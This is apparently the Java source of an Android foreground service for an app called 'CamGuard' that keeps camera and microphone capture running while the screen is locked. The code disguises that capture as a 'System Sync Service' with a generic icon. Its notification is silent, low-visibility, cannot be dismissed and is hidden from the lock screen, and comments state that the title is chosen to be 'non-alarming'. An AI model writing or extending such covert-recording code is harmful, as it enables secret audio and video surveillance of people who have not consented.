package com.systemsync.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

/**
 * ============================================
 * Android Foreground Service for CamGuard
 * ============================================
 * 
 * This service keeps the camera and microphone
 * stream active even when the app is minimized
 * or the screen is locked.
 * 
 * Key configurations:
 * - Notification Importance: LOW (minimally visible)
 * - Title: "System Sync Service" (non-alarming)
 * - Ongoing: Cannot be dismissed by the user
 * - Show when: Hidden from lock screen
 * 
 * Required permissions in AndroidManifest.xml:
 * - FOREGROUND_SERVICE
 * - FOREGROUND_SERVICE_CAMERA
 * - FOREGROUND_SERVICE_MICROPHONE
 */
public class ForegroundService extends Service {

    private static final String CHANNEL_ID = "system-sync-channel";
    private static final String CHANNEL_NAME = "System Sync";
    private static final int NOTIFICATION_ID = 1001;

    public static final String ACTION_START = "com.systemsync.service.START";
    public static final String ACTION_STOP = "com.systemsync.service.STOP";
    public static final String ACTION_UPDATE = "com.systemsync.service.UPDATE";

    public static final String EXTRA_TITLE = "notification_title";
    public static final String EXTRA_TEXT = "notification_text";

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_NOT_STICKY;

        String action = intent.getAction();

        if (ACTION_START.equals(action)) {
            String title = intent.getStringExtra(EXTRA_TITLE);
            String text = intent.getStringExtra(EXTRA_TEXT);
            startForeground(title, text);
        } else if (ACTION_STOP.equals(action)) {
            stopForeground(true);
            stopSelf();
        } else if (ACTION_UPDATE.equals(action)) {
            String title = intent.getStringExtra(EXTRA_TITLE);
            String text = intent.getStringExtra(EXTRA_TEXT);
            updateNotification(title, text);
        }

        return START_STICKY; // Restart if killed by the system
    }

    /**
     * Start the foreground service with a low-priority notification
     */
    private void startForeground(String title, String text) {
        Notification notification = buildNotification(
                title != null ? title : "System Sync Service",
                text != null ? text : "Background sync is running"
        );
        startForeground(NOTIFICATION_ID, notification);
    }

    /**
     * Build the notification with LOW importance for minimal visibility
     */
    private Notification buildNotification(String title, String text) {
        // Create an empty intent for the notification tap (no action)
        Intent notificationIntent = new Intent(this, ForegroundService.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
                this, 0, notificationIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(title)
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_menu_compass) // Generic system icon
                .setPriority(NotificationCompat.PRIORITY_LOW)     // Minimally visible
                .setOngoing(true)                                  // Cannot be dismissed
                .setShowWhen(false)                                // Don't show timestamp
                .setSilent(true)                                   // No sound or vibration
                .setCategory(NotificationCompat.CATEGORY_SERVICE)  // Service category
                .setContentIntent(pendingIntent);

        // Hide from lock screen on Android 7+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            builder.setVisibility(NotificationCompat.VISIBILITY_SECRET);
        }

        return builder.build();
    }

    /**
     * Create a LOW importance notification channel
     */
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    CHANNEL_NAME,
                    NotificationManager.IMPORTANCE_LOW // Minimally visible
            );
            channel.setDescription("System sync notifications");
            channel.setShowBadge(false);           // No badge in launcher
            channel.enableLights(false);            // No LED
            channel.enableVibration(false);         // No vibration
            channel.setSound(null, null);           // No sound
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET); // Hidden from lock screen

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    /**
     * Update the notification text while keeping the service running
     */
    private void updateNotification(String title, String text) {
        Notification notification = buildNotification(
                title != null ? title : "System Sync Service",
                text != null ? text : "Background sync is running"
        );
        NotificationManager manager = getSystemService(NotificationManager.class);
        if (manager != null) {
            manager.notify(NOTIFICATION_ID, notification);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null; // Not a bound service
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopForeground(true);
    }
}
